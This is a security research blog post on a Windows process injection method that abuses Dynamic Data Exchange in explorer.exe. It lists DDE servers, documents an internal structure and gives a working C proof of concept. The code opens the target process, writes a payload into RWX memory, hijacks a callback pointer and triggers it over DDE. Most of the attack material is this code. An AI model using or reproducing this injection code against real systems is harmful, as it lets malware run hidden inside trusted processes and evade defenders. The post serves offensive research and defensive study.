# https://modexp.wordpress.com/2019/08/09/windows-process-injection-breaking-badder/

## [Windows Process Injection: Breaking BaDDEr](https://modexp.wordpress.com/2019/08/09/windows-process-injection-breaking-badder/)

Posted on [August 9, 2019](https://modexp.wordpress.com/2019/08/09/windows-process-injection-breaking-badder/ "7:00 pm") by[odzhan](https://modexp.wordpress.com/author/odzhan/ "View all posts by odzhan")

## Introduction

[Dynamic Data Exchange](https://docs.microsoft.com/en-us/windows/win32/dataxchg/about-dynamic-data-exchange) (DDE) is a data sharing protocol while the [Dynamic Data Exchange Management Library](https://docs.microsoft.com/en-us/windows/win32/dataxchg/dynamic-data-exchange-management-library) (DDEML) facilitates sharing of data among applications over the DDE protocol. DDE made the headlines in October 2017 after [a vulnerability](https://docs.microsoft.com/en-us/security-updates/securityadvisories/2017/4053440) was discovered in Microsoft Office that could be exploited to execute code. Since then, it’s been disabled by default and is therefore not considered a critical component. The scope of this injection method is limited to explorer.exe, unless of course you know of other applications that use it. I’d like to thank [Adam](https://twitter.com/Hexacorn) for the discussion about using DDE for injection and also the cheesy name. 😀

## Enumerating DDE Servers

The only DLL that use DDE servers on Windows 10 are shell32.dll, ieframe.dll and twain\_32.dll. shell32.dll creates three DDE servers that are hosted by explorer.exe. The following code uses DDEML API to list servers and the process hosting them.

```
VOID dde_list(VOID) {
    CONVCONTEXT cc;
    HCONVLIST   cl;
    DWORD       idInst = 0;
    HCONV       c = NULL;
    CONVINFO    ci;
    WCHAR       server[MAX_PATH];

    if(DMLERR_NO_ERROR != DdeInitialize(&idInst, NULL, APPCLASS_STANDARD, 0)) {
      printf("unable to initialize : %i.\n", GetLastError());
      return;
    }

    ZeroMemory(&cc, sizeof(cc));
    cc.cb = sizeof(cc);
    cl = DdeConnectList(idInst, 0, 0, 0, &cc);

    if(cl != NULL) {
      for(;;) {
        c = DdeQueryNextServer(cl, c);
        if(c == NULL) break;
        ci.cb = sizeof(ci);
        DdeQueryConvInfo(c, QID_SYNC, &ci);
        DdeQueryString(idInst, ci.hszSvcPartner, server, MAX_PATH, CP_WINUNICODE);

        printf("Service : %-10ws Process : %ws\n",
          server, wnd2proc(ci.hwndPartner));
      }
      DdeDisconnectList(cl);
    } else {
      printf("DdeConnectList : %x\n", DdeGetLastError(idInst));
    }
    DdeUninitialize(idInst);
}
```

## DDE Internals

Figure 1 shows the decompiled code where the servers are created.

![](https://modexp.wordpress.com/wp-content/uploads/2019/08/dde_initialize.png?w=640&h=282)

Figure 1. DDE initialization in shell32.dll

`user32!DdeInitializeW` is where all the interesting stuff occurs. `user32!InternalDdeInitialize` will allocate memory on the heap for a structure called `CL_INSTANCE_INFO` which isn’t documented in the public SDK, but you can still find it online.

```
typedef struct tagCL_INSTANCE_INFO {
    struct tagCL_INSTANCE_INFO *next;
    HANDLE                      hInstServer;
    HANDLE                      hInstClient;
    DWORD                       MonitorFlags;
    HWND                        hwndMother;
    HWND                        hwndEvent;
    HWND                        hwndTimeout;
    DWORD                       afCmd;
    PFNCALLBACK                 pfnCallback;
    DWORD                       LastError;
    DWORD                       tid;
    LATOM                      *plaNameService;
    WORD                        cNameServiceAlloc;
    PSERVER_LOOKUP              aServerLookup;
    short                       cServerLookupAlloc;
    WORD                        ConvStartupState;
    WORD                        flags;              // IIF_ flags
    short                       cInDDEMLCallback;
    PLINK_COUNT                 pLinkCount;
} CL_INSTANCE_INFO, *PCL_INSTANCE_INFO;
```

The only field we’re interested in is `pfnCallback`. The steps to inject are:

1. Find the DDE mother window by its registered class name “DDEMLMom”.
2. Read the address of `CL_INSTANCE_INFO` using `GetWindowLongPtr`.
3. Allocate RWX memory in remote process and write payload there.
4. Overwrite the function pointer pfncallback with the remote address of payload.
5. Trigger execution over DDE.

Figure 2 shows the properties of the mother window. As you can see, index zero of the Window Bytes is set. This is the address of `CL_INSTANCE_INFO`.

![](https://modexp.wordpress.com/wp-content/uploads/2019/08/win_properties.png?w=640)

Figure 2. Mother Window for DDE server.

## Injection

The following is a PoC to demonstrate the method works. Full source can be [found here](https://github.com/odzhan/injection/tree/master/dde).

```
VOID dde_inject(LPVOID payload, DWORD payloadSize) {
    HWND             hw;
    SIZE_T           rd, wr;
    LPVOID           ptr, cs;
    HANDLE           hp;
    CL_INSTANCE_INFO pcii;
    CONVCONTEXT      cc;
    HCONVLIST        cl;
    DWORD            pid, idInst = 0;

    // 1. find a DDEML window and read the address
    //    of CL_INSTANCE_INFO
    hw = FindWindowEx(NULL, NULL, L"DDEMLMom", NULL);
    if(hw == NULL) return;
    ptr = (LPVOID)GetWindowLongPtr(hw, GWLP_INSTANCE_INFO);
    if(ptr == NULL) return;

    // 2. open the process and read CL_INSTANCE_INFO
    GetWindowThreadProcessId(hw, &pid);
    hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if(hp == NULL) return;
    ReadProcessMemory(hp, ptr, &pcii, sizeof(pcii), &rd);

    // 3. allocate RWX memory and write payload there.
    //    update callback
    cs = VirtualAllocEx(hp, NULL, payloadSize,
      MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hp, cs, payload, payloadSize, &wr);
    WriteProcessMemory(
      hp, (PBYTE)ptr + offsetof(CL_INSTANCE_INFO, pfnCallback),
      &cs, sizeof(ULONG_PTR), &wr);

    // 4. trigger execution via DDE protocol
    DdeInitialize(&idInst, NULL, APPCLASS_STANDARD, 0);
    ZeroMemory(&cc, sizeof(cc));
    cc.cb = sizeof(cc);
    cl = DdeConnectList(idInst, 0, 0, 0, &cc);
    DdeDisconnectList(cl);
    DdeUninitialize(idInst);

    // 5. restore original pointer and cleanup
    WriteProcessMemory(
      hp,
      (PBYTE)ptr + offsetof(CL_INSTANCE_INFO, pfnCallback),
      &pcii.pfnCallback, sizeof(ULONG_PTR), &wr);

    VirtualFreeEx(hp, cs, 0, MEM_DECOMMIT | MEM_RELEASE);
    CloseHandle(hp);
}
```

### Share this:

- [Share on X (Opens in new window)X](https://modexp.wordpress.com/2019/08/09/windows-process-injection-breaking-badder/?share=twitter&nb=1)
- [Share on Facebook (Opens in new window)Facebook](https://modexp.wordpress.com/2019/08/09/windows-process-injection-breaking-badder/?share=facebook&nb=1)

LikeLoading...

### _Related_

[Windows Process Injection: Command Line and Environment Variables](https://modexp.wordpress.com/2020/07/31/wpi-cmdline-envar/ "Windows Process Injection: Command Line and Environment&nbsp;Variables")July 31, 2020In "assembly"

[Shellcode: A reverse shell for Linux in C with support for TLS/SSL](https://modexp.wordpress.com/2019/04/24/glibc-shellcode/ "Shellcode: A reverse shell for Linux in C with support for&nbsp;TLS/SSL")April 24, 2019In "assembly"

[Shellcode: Windows on ARM64 / AArch64](https://modexp.wordpress.com/2024/09/16/windows_arm64/ "Shellcode: Windows on ARM64 /&nbsp;AArch64")September 16, 2024In "arm"

This entry was posted in [injection](https://modexp.wordpress.com/category/injection/), [malware](https://modexp.wordpress.com/category/malware/), [process injection](https://modexp.wordpress.com/category/process-injection/), [programming](https://modexp.wordpress.com/category/programming/), [windows](https://modexp.wordpress.com/category/windows/) and tagged [breaking baDDEr](https://modexp.wordpress.com/tag/breaking-badder/), [dde](https://modexp.wordpress.com/tag/dde/), [injection](https://modexp.wordpress.com/tag/injection/), [poc](https://modexp.wordpress.com/tag/poc/), [windows](https://modexp.wordpress.com/tag/windows/). Bookmark the [permalink](https://modexp.wordpress.com/2019/08/09/windows-process-injection-breaking-badder/ "Permalink to Windows Process Injection: Breaking BaDDEr").

### Leave a comment [Cancel reply](https://modexp.wordpress.com/2019/08/09/windows-process-injection-breaking-badder/\#respond)

Δ

- Search for:

- ### Recent Posts

  - [Shellcode: Windows on ARM64 / AArch64](https://modexp.wordpress.com/2024/09/16/windows_arm64/)
  - [Delegated NT DLL](https://modexp.wordpress.com/2024/02/13/delegated-nt-dll/)
  - [WOW64 Callback Table (FinFisher)](https://modexp.wordpress.com/2023/04/19/finding-the-wow64-callback-table/)
  - [Shellcode: Linux on RISC-V 64-Bit](https://modexp.wordpress.com/2022/05/02/shellcode-risc-v-linux/)
  - [Windows Process Injection: Command Line and Environment Variables](https://modexp.wordpress.com/2020/07/31/wpi-cmdline-envar/)
  - [MiniDumpWriteDump via COM+ Services DLL](https://modexp.wordpress.com/2019/08/30/minidumpwritedump-via-com-services-dll/)
  - [Windows Process Injection: Breaking BaDDEr](https://modexp.wordpress.com/2019/08/09/windows-process-injection-breaking-badder/)
  - [Shellcode: In-Memory Execution of JavaScript, VBScript, JScript and XSL](https://modexp.wordpress.com/2019/07/21/inmem-exec-script/)
  - [Shellcode: In-Memory Execution of DLL](https://modexp.wordpress.com/2019/06/24/inmem-exec-dll/)
  - [Shellcode: Loading .NET Assemblies From Memory](https://modexp.wordpress.com/2019/05/10/dotnet-loader-shellcode/)
  - [Shellcode: A reverse shell for Linux in C with support for TLS/SSL](https://modexp.wordpress.com/2019/04/24/glibc-shellcode/)
  - [How the L0pht (probably) optimized attack against the LanMan hash.](https://modexp.wordpress.com/2019/02/02/3883/)

- [Comment](https://modexp.wordpress.com/2019/08/09/windows-process-injection-breaking-badder/#respond)
- [Reblog](https://modexp.wordpress.com/2019/08/09/windows-process-injection-breaking-badder/)
- [Subscribe](https://modexp.wordpress.com/2019/08/09/windows-process-injection-breaking-badder/) [Subscribed](https://modexp.wordpress.com/2019/08/09/windows-process-injection-breaking-badder/)




[![](https://modexp.wordpress.com/wp-content/uploads/2018/08/cropped-debug.png?w=50)modexp](https://modexp.wordpress.com/)









Join 58 other subscribers

Sign me up


Have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fmodexp.wordpress.com%2F2019%2F08%2F09%2Fwindows-process-injection-breaking-badder%2F&signup_flow=account)

- [![](https://modexp.wordpress.com/wp-content/uploads/2018/08/cropped-debug.png?w=50)modexp](https://modexp.wordpress.com/)



[Copy shortlink](https://wp.me/p7ABSW-18b) [View post in Reader](https://wordpress.com/reader/blogs/112159794/posts/4351)



[Manage subscriptions](https://subscribe.wordpress.com/) [Sign up](https://wordpress.com/start/) [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fmodexp.wordpress.com%2F2019%2F08%2F09%2Fwindows-process-injection-breaking-badder%2F&signup_flow=account)



[Report this content](https://wordpress.com/abuse/?report_url=https://modexp.wordpress.com/2019/08/09/windows-process-injection-breaking-badder/)



[Collapse this bar](https://modexp.wordpress.com/2019/08/09/windows-process-injection-breaking-badder/)


[Toggle photo metadata visibility](https://modexp.wordpress.com/2019/08/09/windows-process-injection-breaking-badder/#)[Toggle photo comments visibility](https://modexp.wordpress.com/2019/08/09/windows-process-injection-breaking-badder/#)

Loading Comments...

Write a Comment...

Email (Required)Name (Required)Website

[Download image](https://modexp.wordpress.com/2019/08/09/windows-process-injection-breaking-badder/#)

%d

![](https://pixel.wp.com/g.gif?blog=112159794&v=wpcom&tz=0&user_id=0&post=4351&subd=modexp&host=modexp.wordpress.com&ref=https%3A%2F%2Fwww.google.com%2F&rand=0.722353066337518)